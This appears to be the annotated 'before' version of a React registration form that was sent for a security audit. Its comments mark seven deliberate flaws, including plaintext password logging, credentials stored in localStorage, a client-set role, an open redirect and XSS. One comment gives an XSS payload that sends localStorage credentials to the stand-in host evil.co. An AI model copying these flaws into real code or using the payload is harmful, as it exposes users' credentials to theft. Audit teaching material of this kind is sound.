// ❌ ANTES — Formulario de registro original (enviado a la IA para la auditoría).
// Vulnerabilidades marcadas con [V#].
import { useState } from 'react';
import { supabase } from '../lib/supabase';

export default function RegisterPage() {
  const [form, setForm] = useState({ name: '', email: '', password: '' });
  const [message, setMessage] = useState('');

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    console.log('Registrando usuario', form); // [V1] contraseña en texto plano en la consola

    if (form.password.length < 4) {                                     // [V2] política de contraseñas débil
      setMessage('<b>La contraseña es muy corta</b>');
      return;
    }

    const { data, error } = await supabase.auth.signUp({
      email: form.email,
      password: form.password,
      options: {
        data: { full_name: form.name, role: 'customer' },              // [V3] el rol viaja desde el cliente (editable)
      },
    });

    if (error) {
      setMessage(`Error: ${error.message}`);                           // [V4] enumeración: "User already registered"
      return;
    }

    localStorage.setItem('user', JSON.stringify({ ...data.user, password: form.password })); // [V5] credenciales en localStorage
    setMessage(`<h2>¡Bienvenido ${form.name}!</h2>`);                  // [V6] XSS almacenado/reflejado

    const redirect = new URLSearchParams(window.location.search).get('redirect');
    if (redirect) window.location.href = redirect;                     // [V7] open redirect → phishing
  };

  return (
    <form onSubmit={handleSubmit}>
      <input placeholder="Nombre" onChange={(e) => setForm({ ...form, name: e.target.value })} />
      <input placeholder="Email" onChange={(e) => setForm({ ...form, email: e.target.value })} />
      <input type="password" placeholder="Contraseña" onChange={(e) => setForm({ ...form, password: e.target.value })} />
      <button>Registrarme</button>
      {/* [V6] Nombre "<img src=x onerror=fetch('//evil.co?c='+localStorage.user)>" ejecuta JS */}
      <div dangerouslySetInnerHTML={{ __html: message }} />
    </form>
  );
}
